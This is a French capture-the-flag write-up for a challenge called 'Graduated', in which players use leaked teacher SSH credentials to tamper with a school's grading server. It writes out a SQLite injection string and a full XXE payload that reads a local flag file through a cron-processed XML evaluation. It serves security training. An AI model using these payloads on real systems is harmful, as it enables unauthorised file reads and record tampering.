# Graduated

## Sujet :

> Vous avez raté votre examen de PHP. Cheh!
> 
> Furieux, vous avez décidé de prouver vos compétences en modifiant directement votre note sur le serveur de votre école.
> 
> Vous avez réussi à compromettre les identifiants de votre professeur absent.
>
> === Connexion SSH ===
> 
> Login : teacher
> 
> Mdp : teacher
> 
> Serveur : graduated.phack.fr

Tags : `system` `xml` `medium`

## Solution :

En fouillant un peu le serveur, on remarque dans le dossier de l'utilisateur `rector` un script en python ainsi que des log a priori générée par ce script, une base de donnée SQLite et le flag.

En lisant les logs, on comprend que le script est lancé toutes les minutes par une tâche cron. Malheureusement on ne peut pas lire le script, il faut donc trouver ce qu'il fait.

De retour dans le dossier de `teacher`, on comprend qu'il suffit de placer un fichier suivant le même modèle que `template.xml` dans le dossier `evaluations` pour que celui-ci soit lu par le script python et placé dans le dossier `done`.

En faisant quelques tests, il s'avère que le script lis le contenu du fichier xml et place les informations contenues dedans dans la base de donnée SQLite.

Notre première approche a été de trouver une injection SQL. Pour cela on remarque qu'en plaçant un `'` dans un des champs, le script plantait au niveau de la requête SQLite. On a donc essayé d'injecter certains champs, et seul le champs 'comment' n'a aucune vérification de contenu.

``` xml
<?xml version="1.0" encoding="utf-8"?>

<evaluation>
  <student>
    <firstname>Maxime</firstname>
    <lastname>DUPONT DE L</lastname>
  </student>
  <grade>20</grade>
  <subject>Biologie</subject>
  <teacher>
    <firstname>Emile</firstname>
    <lastname>LOUIS</lastname>
  </teacher>
  <comment>' || sqlite_version(), 0, 0) -- </comment>
</evaluation>
```

Cependant, pour lire un fichier à partir d'une injection SQLite requiert plusieurs requêtes, et on ne peut injecter qu'à l'intérieur de la requête INSERT exécuté par le script python...

Puis nous nous sommes souvenus qu'un des tags du challenge est `xml`. Un vrai parser XML doit être utilisé pour lire notre fichier, et donc il suffit de faire une XXE.

``` xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///home/rector/flag.txt">
  ]>

<evaluation>
  <student>
    <firstname>Maxime</firstname>
    <lastname>DUPONT DE L</lastname>
  </student>
  <grade>20</grade>
  <subject>Biologie</subject>
  <teacher>
    <firstname>Emile</firstname>
    <lastname>LOUIS</lastname>
  </teacher>
  <comment>&xxe;</comment>
</evaluation>
```

On attend une petite minute, puis on peut afficher le contenu de `graduation.db` dans le dossier de rector.

`PHACK{XmL_3x7Ern4l_3n7i7iEs_fr0m_b4sH}`